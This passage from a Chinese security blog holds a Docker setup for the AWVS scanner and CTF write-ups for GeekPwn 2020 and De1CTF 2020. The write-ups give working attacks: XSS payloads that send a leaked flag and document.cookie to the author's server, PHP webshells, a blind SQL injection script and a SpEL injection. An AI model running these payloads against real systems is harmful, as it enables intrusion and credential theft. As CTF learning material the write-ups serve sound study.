deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial universe
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe
deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse
deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse
deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties
deb http://archive.canonical.com/ubuntu xenial partner
deb-src http://archive.canonical.com/ubuntu xenial partner
deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted
deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties
deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe
deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse
EOF
echo &quot;$source&quot; &gt; /etc/apt/sources.list 
cat /etc/apt/sources.list 
apt-get update
#for i in ${shared_obj_deps[@]}
#do
#    echo install $i
#    apt-get install $i -y
#done
apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 bzip2 sudo libv8-dev -y
echo &quot;install success&quot;
</code></pre>
<p>将Dockerfile放在awvs同级目录下,打开命令行移动到Dockerfile所在文件夹,<code>docker build -t awvs .</code></p>
<p>用Dockerfile创建镜像后,用<code>docker run --privileged=true -p 443:3443-it -d awvs &quot;/sbin/init&quot;</code>来创建容器</p>
<p>接着等待一会就可以运行了,在改一下本机的hosts,美滋滋,记得是用https去访问</p>
<p><img src="https://i.loli.net/2020/03/18/5nruJk7RmfLYjtw.png" alt="image3135"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://youngrichog.github.io/2019/08/10/Docker-AWVS批量部署/" target="_blank" rel="noopener">https://youngrichog.github.io/2019/08/10/Docker-AWVS%E6%89%B9%E9%87%8F%E9%83%A8%E7%BD%B2/</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/docker部署awvs/">https://www.ccreater.top/1970/01/01/docker部署awvs/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/docker%E9%83%A8%E7%BD%B2awvs/" data-id="ckmn5756y0058s1ni62ts7u5i" data-title="docker部署awvs" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-geekpwn2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/geekpwn2020/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/geekpwn2020/">geekpwn2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="geekpwn-2020热身赛"><a href="#geekpwn-2020热身赛" class="headerlink" title="geekpwn 2020热身赛"></a>geekpwn 2020热身赛</h1><h2 id="cosplay"><a href="#cosplay" class="headerlink" title="cosplay"></a>cosplay</h2><p>直接用cos的api读取文件</p>
<pre><code class="javascript">cos.getBucket({
    Bucket: Bucket,
    Region: Region,
}, function(err, data) {
    console.log(err || data.Contents);
});


cos.getObject({
    Bucket: Bucket,
    Region: Region,
    Key: &#39;f1L9@/flag.txt&#39;,
}, function(err, data) {
    console.log(err || data.Body);
});
</code></pre>
<h2 id="noXss2020"><a href="#noXss2020" class="headerlink" title="noXss2020"></a>noXss2020</h2><pre><code class="python">from flask import Flask, request, jsonify, Response
from os import getenv

app = Flask(__name__)

DATASET = {
    114: &#39;514&#39;,
    810: &#39;8931919&#39;,
    2017: &#39;https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup&#39;,
    2019: &#39;https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view&#39;,
    2020: &#39;flag{2333333333}&#39;
}


@app.before_request
def check_host():
    pass


@app.route(&quot;/&quot;)
def index():
    return app.send_static_file(&#39;index.html&#39;)


@app.route(&quot;/search&quot;)
def search_handler():
    keyword = request.args.get(&#39;keyword&#39;)
    if keyword is None:
        return jsonify(DATASET)
    else:
        ret = {}
        for i in DATASET:
            if keyword in DATASET[i]:
                ret[i] = DATASET[i]
        return jsonify(ret), 200 if len(ret) else 404


@app.after_request
def add_security_headers(resp):
    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;
    resp.headers[&#39;Content-Security-Policy&#39;] = &#39;default-src \&#39;self\&#39;; frame-src https://www.youtube.com&#39;
    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;
    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;
    return resp


if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=3000, )
</code></pre>
<p>我们注意到search是通过in来判断是否存在，并返回404或200</p>
<p>虽然<code>http://noxss2020.cal1.cn:3000/</code>有cors,但是我们并不需要他返回的内容，我们只需要状态码，这样就简单多了。我们将页面当成css来加载，通过是否加载成功来判断状态码</p>
<p>payload:</p>
<pre><code class="html">&lt;html&gt;
&lt;body&gt;

&lt;script&gt;
var guess=&quot;flag&quot;;
var ok=true;
function check(text){
    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener(&#39;load&#39;, function () {

        guess=unescape(text);
        console.log(guess)
        ok=true;
        if(guess.endsWith(&quot;}&quot;)){
            location=&quot;http://ccreater.top:60010/log.php?log=&quot;+guess;
        };
        var s = guess.substr(0,guess.length-1);
        while(tmp=document.head.querySelector(&#39;link[href*=&quot;&#39;+s+&#39;&quot;&#39;)){
            tmp.remove();
        }
        fuzz()
    });
}
function make(text){
    head = document.getElementsByTagName(&#39;head&#39;)[0];

    var url = &quot;http://127.0.0.1:3000/search?keyword=&quot;+escape(text),
    link = document.createElement(&#39;link&#39;);
    link.rel = &quot;stylesheet&quot;;
    link.href = url;
    head.appendChild(link);
    check(escape(text));
}

async function fuzz(){
    for(i of &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}&quot;){
        if(make(guess+i)){
            break;
        }
    }
    return true
}
function exploit(){
    fuzz()
}

fuzz()
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h2><p>阅读代码发现：</p>
<pre><code>function(e, t, r) {
        &quot;use strict&quot;;
        r.r(t);
        r(91);
        var n = {
            mounted: function() {
                window.addEventListener(&quot;message&quot;, (function(e) {
                    if (e.origin.match(&quot;http://umsg.iffi.top&quot;))
                        switch (e.data.action) {
                        case &quot;append&quot;:
                            return void (document.getElementsByTagName(&quot;main&quot;)[0].innerHTML += e.data.payload);
                        case &quot;debug&quot;:
                            return void console.log(e.data.payload);
                        case &quot;ping&quot;:
                            return void e.source.postMessage(&quot;pong&quot;, &quot;*&quot;)
                        }
                }
                ), !1),
                postMessage({
                    action: &quot;ping&quot;
                })
            }
        }</code></pre><p>那么我们可以在页面中嵌入iframe来postMessage,从而插入恶意内容，唯一的障碍是：<code>e.origin.match(&quot;http://umsg.iffi.top&quot;)</code></p>
<p>因为match是一个正则匹配函数，所以构造<code>http://umsg_iffi_top.evildomain</code>来绕过</p>
<p>payload:</p>
<pre><code>&lt;html&gt;
&lt;body&gt;

&lt;iframe src=&quot;http://umsg.iffi.top:3000/&quot; height=&quot;100%&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;
&lt;/iframe&gt;
&lt;script&gt;
setTimeout(()=&gt;{
document.body.children[0].contentWindow.postMessage({action:&quot;append&quot;,payload:&quot;&lt;img src=1 onerror=&#39;location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)&#39;&gt;&quot;},&quot;http://umsg.iffi.top:3000/&quot;)
},5000);
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/geekpwn2020/">https://www.ccreater.top/1970/01/01/geekpwn2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/geekpwn2020/" data-id="ckmn5756y005bs1ni0aq4h1y2" data-title="geekpwn2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-de1ctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/de1ctf2020/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/de1ctf2020/">de1ctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="de1ctf-2020"><a href="#de1ctf-2020" class="headerlink" title="de1ctf 2020"></a>de1ctf 2020</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><pre><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</code></pre><p>测试发现：禁止ph结尾后缀，但是可以上传.htaccess</p>
<p>上传.htaccess</p>
<pre><code>AddType application/x-httpd-p\
hp .jpg</code></pre><p>上传test.jpg</p>
<pre><code class="php">&lt;?=eval($_POST[0]);</code></pre>
<pre><code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a><strong>mixture</strong></h2><pre><code>index.php
profile.php
select.php
member.php
admin.php
logout.php</code></pre><p>除了admin其他用户不会检查密码</p>
<p>神奇的注释</p>
<pre><code>index.php:&lt;!------ Include the above in your HEAD tag ----------&gt;
member.php:&lt;!--orderby--&gt;</code></pre><p>后来学长说member.php的orderby参数可以注入，我是有点不信的，后来想想自己没测出来也是正常的：</p>
<ol>
<li>我不知道orderby会将输入放在sql语句的位置</li>
<li>不知道有没有waf，无法确认waf是否存在</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505122140.png" alt="image697"></p>
<p>。。。我应该fuzz一下的</p>
<p>黑名单：</p>
<pre><code>if
union</code></pre><p>最后的payload:</p>
<pre><code class="sql">http://134.175.185.244/member.php?orderby=AND case when (ASCII(SUBSTRING((SELECT USER()),1,1)))=1 then BENCHMARK(100000,MD5(NOW())) ELSE 2 END</code></pre>
<p>盲注脚本：</p>
<pre><code class="python">import requests
import time
#修改bigger和sqlinj就好


#实现bigger才能使用
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid

#待求数据大于num
def bigger(num):
    return sqlinj(num)
def less(num):
    pass
def equal(num):
    pass

def sqlinj(num):

    burp0_url = &quot;http://134.175.185.244:80/member.php&quot;
    param={&quot;orderby&quot;:&quot;AND case when (ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()),{POS},1)))&gt;{GUESS} then BENCHMARK(100000,MD5(NOW())) ELSE 2 END&quot;.format(POS=pos,GUESS=num)}
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;p781mlp8a9sp3ggrf1solslvn3&quot;}
    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    try :
        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param,timeout=2)
    except Exception:
        return True
    print(&quot;test &quot;,num)
    return False


result=&quot;&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<pre><code>member,users
users:id,username,money
member:id,username,password
admin 18a960a3a0b3554b314ebe77fe545c85</code></pre><p>在cmd5上找到密码： goodlucktoyou </p>
<p>打开admin是一个phpinfo</p>
<p>search是一个类似文件包含的东东</p>
<p>但是很多都不行如/etc/passwd等等</p>
<p>fuzz后得到源码</p>
<p>select.php</p>
<pre><code class="php">&lt;?php
include &quot;profile.php&quot;;
$search = $_POST[&#39;search&#39;];

if($_SESSION[&#39;admin&#39;]==1){
    print &lt;&lt;&lt;EOT
&lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt;
        &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt;
    &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
    &lt;/div&gt;
&lt;/form&gt;
EOT;
}
else{
    print &lt;&lt;&lt;EOT
  &lt;div class=&quot;container&quot;&gt; 
      &lt;div class=&quot;row&quot;  &gt;            
              &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt;             
                &lt;div class=&quot;input-group&quot; display：block;margin：0 auto;&gt;                                                       
                            &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt;
                              &lt;/span&gt;

                &lt;/div&gt;&lt;!-- /input-group --&gt;              
              &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt; 
      &lt;/div&gt;
  &lt;/div&gt;
EOT;
}
if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){
    //var_dump(urldecode($search));
    Minclude(urldecode($search));
    //lookup($search);
}
</code></pre>
<p>admin.php</p>
<pre><code class="php">&lt;?php
include &quot;profile.php&quot;;
session_start();
if(empty($_SESSION[&#39;user&#39;])){
    header(&quot;location: index.php&quot;);
}
if($_SESSION[&#39;admin&#39;]==1){
    phpinfo();
}
else{
    print &lt;&lt;&lt;EOT
&lt;div class=&quot;row&quot;&gt;
  &lt;div class=&quot;col-md-6 col-md-offset-4&quot;&gt;You are not admin!!!!&lt;/div&gt;
&lt;/div&gt;
EOT;

}</code></pre>
<p>member.php</p>
<pre><code class="php">&lt;?php
include &quot;profile.php&quot;;
include &quot;config.php&quot;;
$orderby = $_GET[&#39;orderby&#39;];
?&gt;

    &lt;?php
    print &lt;&lt;&lt;EOT
&lt;div class=&quot;table-responsive&quot;&gt;
    &lt;table class=&quot;table&quot;&gt;
        &lt;!--orderby--&gt;
        &lt;caption&gt;ALLmember&lt;/caption&gt;
        &lt;thead&gt;
        &lt;tr&gt;
            &lt;th&gt;id&lt;/th&gt;
            &lt;th&gt;username&lt;/th&gt;
            &lt;th&gt;money&lt;/th&gt;&lt;/tr&gt;
        &lt;/thead&gt;
        &lt;tbody&gt;
EOT;
    if(!empty($orderby)){
        $blacklist = &quot;/if|desc|sleep|rand|updatexml|\^|union|\|\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i&quot;;
        if(preg_match($blacklist, $orderby))
            exit(&quot;No~~hacker!&quot;);
        $sql = &quot;SELECT * FROM users order by id &quot;.$orderby;
        $result = $mysqli-&gt;query($sql);
        if($result===false){
            $sql=&quot;SELECT * FROM users&quot;;
        }
    }
    else{
        $sql = &quot;SELECT * FROM users&quot;;
    }
        $result = $mysqli-&gt;query($sql);
        /* free result set */
        while($row = $result-&gt;fetch_row()){
            //var_dump($row);
            print &lt;&lt;&lt;EOT
        &lt;tr&gt;
            &lt;td&gt;$row[0]&lt;/td&gt;
            &lt;td&gt;$row[1]&lt;/td&gt;
            &lt;td&gt;$row[2]&lt;/td&gt;&lt;/tr&gt;
        &lt;tr&gt;
EOT;
        }
        $result-&gt;free();
        $mysqli-&gt;close();
    print &lt;&lt;&lt;EOT
      &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/div&gt;
EOT;</code></pre>
<p>index.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
include &quot;config.php&quot;;
session_start();
if(!empty($_SESSION[&#39;user&#39;])){
    header(&quot;location: /profile.php&quot;);
}
    session_start();
    $username = $_POST[&#39;username&#39;];
    $password = $_POST[&#39;password&#39;];
    if(!empty($username)&amp;&amp;!empty($password)){
        if($username===&#39;admin&#39;)
            {
                $sql = &quot;select password from member&quot;;
                $result = $mysqli-&gt;query($sql);
                $row = $result-&gt;fetch_row();
                if($row[0]===md5($password)){
                    $_SESSION[&#39;user&#39;]=&#39;admin&#39;;
                    $_SESSION[&#39;admin&#39;]=1;
                    header(&quot;location: /profile.php&quot;);
                }
                else{
                    echo &quot;&lt;script&gt;alert(&#39;nononon,admin password not right&#39;)&lt;/script&gt;&quot;;
                }
            }
        else{
            $_SESSION[&#39;user&#39;]=&#39;guest&#39;;
            $_SESSION[&#39;admin&#39;]=0;
            header(&quot;location: /profile.php&quot;);
        }
    }
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;profile&lt;/title&gt;
    &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;
    &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;
    &lt;style&gt;
        .fakeimg {
            height: 200px;
            background: #aaa;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;!------ Include the above in your HEAD tag ----------&gt;
&lt;body&gt;
    &lt;div id=&quot;login&quot;&gt;
        &lt;div class=&quot;container&quot;&gt;
            &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt;
                &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt;
                    &lt;div id=&quot;login-box&quot; class=&quot;col-md-19&quot;&gt;
                        &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;
                            &lt;h3 class=&quot;text-center text-info&quot;&gt;Login&lt;/h3&gt;
                            &lt;div class=&quot;form-group&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt;
                                &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;form-group&quot;&gt;
                                &lt;label for=&quot;password&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt;
                                &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;form-group&quot;&gt;
                                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
                            &lt;/div&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;</code></pre>
<p>emm,Minclude是什么神奇的东西</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505134518.png" alt="image8380"></p>
<p>fuzz后发现其实是读取内存里的内容</p>
<p>fuzz得到/readflag,从中可知flag在/flag中</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505143547.png" alt="image8517"></p>
<p>但是要运行的话，那就必须拿到shell,还是说flag在这个程序里</p>
<p>现有以下几种想法：</p>
<ol>
<li>利用/proc/xx/cwd/flag来拿到flag但是，fuzz到10000还没有</li>
<li>从内存中直接拿到flag(好像不行)</li>
<li>从程序中拿到flag(不会,也不清楚行不行)</li>
<li>拿到shell(没思路)</li>
<li>Minclude有洞（没找到）</li>
</ol>
<p>再见</p>
<p>em？</p>
<p><code>../../../../../../../../../../../../../../../../../../../../../../../etc/passwd</code></p>
<p>这样也能读取文件，有没有机会文件包含？</p>
<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h2><pre><code class="php">&lt;?php
//Clear the uploads directory every hour
highlight_file(__FILE__);
$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);
@mkdir($sandbox);
@chdir($sandbox);

if($_POST[&quot;submit&quot;]){
    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){
        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){
            die($_FILES[&quot;file&quot;][&quot;error&quot;]);
        }
        else{
            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);
            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;
        }
    }
    else{
        echo &quot;Not Allow!&quot;;
    }
}

//内容限制：preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)==false 
//后缀限制：不能为：php，不包含..

function Check(){
    $BlackExts = array(&quot;php&quot;);
    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);

    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp; 
        !in_array($exts, $BlackExts) &amp;&amp; 
        !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {
          return true;
    }
    return false;
}
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;upload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>第一步绕过后缀名：.phP</p>
<p>第二步绕过文件内容：</p>
<pre><code class="php">&lt;?php
$a = &#39;A&#39;;
$b = &#39;SYSTEM&#39;;//$b = &#39;readfile&#39;;
$c = &quot;POST&quot;;
$vv = &#39;__&#39;;
$v = &#39;_&#39;;
function fuck($b){
    $data = &#39;&#39;;
    $a = &#39;A&#39;;
    $vv = &#39;__&#39;;
    $v = &#39;_&#39;;
    for ($i = 0; $i &lt; strlen($b); $i++) {
        if (ord($b[$i]) &gt;= ord(&#39;a&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;z&#39;)) {
            $data .= &#39;($&#39; . $v . &#39;=$____),&#39;;
            for ($a = ord(&#39;a&#39;); $a &lt; ord($b[$i]); $a++) {
                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
            }
        } else if (ord($b[$i]) &gt;= ord(&#39;A&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;Z&#39;)) {
            $data .= &#39;($&#39; . $v . &#39;=$___),&#39;;
            for ($a = ord(&#39;A&#39;); $a &lt; ord($b[$i]); $a++) {
                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
            }
        } else {
            $data .= &#39;$&#39; . $v . &#39;=&quot;&#39; . $b[$i] . &#39;&quot;;&#39;;
        }
        $data .= &#39;($&#39; . $vv . &#39;.=$&#39; . $v.&#39;),&#39;;
    }
    return $data;
}
$a=&#39;&lt;?=[($_=[]),($_=@&quot;$_&quot;),($___=$_[(&quot;!&quot;!=&quot;!&quot;)]),($____=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)]),&#39;.fuck($b).&#39;$_____=$__]?&gt;&#39;;//system
$a.=&#39;&lt;?=[($__=&quot;_&quot;),($_=[]),($_=@&quot;$_&quot;),&#39;.fuck($c).&#39;$_]?&gt;&#39;;//_POST
$a.=&#39;&lt;?=[($_____($$__[_]))]?&gt;&#39;;
echo $a;
</code></pre>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre><code>GET /spel/calc?calc=&#39;1&#39;%2b&#39;1&#39; =&gt; 11
GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T07:23:42.244+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1008E: Property or field &#39;length&#39; cannot be found on object of type &#39;java.lang.String&#39; - maybe not public or not valid?&quot;,&quot;path&quot;:&quot;/spel/calc&quot;}</code></pre><p>谷歌一段时间后发现这里使用spel(Spring 表达式语言  Spring Expression Language )来计算的</p>
<p>黑名单：<code>getClass,String,#,new,T(,reader</code></p>
<pre><code>&#39;&#39;.class.forName(&#39;java.l&#39;%2b&#39;ang.Ru&#39;%2b&#39;ntime&#39;).getMethod(&#39;ex&#39;%2b&#39;ec&#39;,&#39;&#39;.class)</code></pre><p>原本想那shell的后来看到OpenRASP,想想还是直接读取文件方便一点</p>
<p>构造payload:</p>
<p><code>neW+java.io.RandomAccessFile(&#39;/flag&#39;,&#39;r&#39;).readLine()</code></p>
<p>SpEL中除了java.lang下的类，其他的类在实例化的是否需要完整的包名</p>
<p>flag:<code>De1CTF{NobodyKnowsMoreThanTrumpAboutJava}</code></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/de1ctf2020/">https://www.ccreater.top/1970/01/01/de1ctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/de1ctf2020/" data-id="ckmn5756z005es1nig0xcezfq" data-title="de1ctf2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-eis2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/eis2019/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/eis2019/">eis2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
